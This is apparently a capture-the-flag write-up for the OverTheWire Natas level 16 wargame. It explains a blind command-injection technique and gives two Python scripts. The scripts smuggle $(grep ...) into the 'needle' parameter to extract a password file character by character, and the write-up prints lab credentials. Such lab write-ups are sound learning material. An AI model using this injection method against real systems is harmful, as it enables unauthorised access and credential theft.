@@ -1,0 +1,42 @@
+In this problem I comeback to an old problem but a regex is applied to limit the access.
+Through searching on the internet I found this https://askubuntu.com/questions/7404/can-i-run-a-command-within-another-command to execute commands inside of other commands.
+So I have a grep -i command, I could use grep -i African$(grep char /etc/natas_webpass/natas17) to verify if the character belongs to the password. I wrote this script for that:
+
+import requests, string
+
+url = 'http://natas16.natas.labs.overthewire.org'
+user = 'natas16'
+passw = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
+passchars = []
+characters = ''.join([string.digits, string.ascii_letters])
+for char in characters:
+    query = f'/?needle=African$(grep {char} /etc/natas_webpass/natas17)'
+    r = requests.get(url+query, auth=(user,passw))
+    if 'African' not in r.text:
+        passchars.append(char)
+print(passchars)
+
+I got this characters ['0', '5', '7', '8', '9', 'b', 'h', 'j', 'k', 'o', 'q', 's', 'v', 'w', 'C', 'E', 'F', 'H', 'J', 'L', 'N', 'O', 'T'] then start iterating to the 32 characters of the password but using grep ^char to check if there is the first letters. Is the same code from the previous but concatenating the password until having it all:
+
+import requests, string
+
+url = 'http://natas16.natas.labs.overthewire.org'
+user = 'natas16'
+passw = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
+chars = ['0', '5', '7', '8', '9', 'b', 'h',
+		 'j', 'k', 'o', 'q', 's', 'v', 'w',
+		 'C', 'E', 'F', 'H', 'J', 'L', 'N',
+		 'O', 'T']
+passnew = ''
+
+for _ in range(32):
+	for char in chars:
+		temp = ''.join([passnew, char])
+		query = f'/?needle=African$(grep ^{temp} /etc/natas_webpass/natas17)'
+		uri = url + query
+		r = requests.get(uri, auth=(user, passw))
+		if 'African' not in r.text:
+			passnew += char
+			print("Password: {}".format(passnew))
+
+EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC
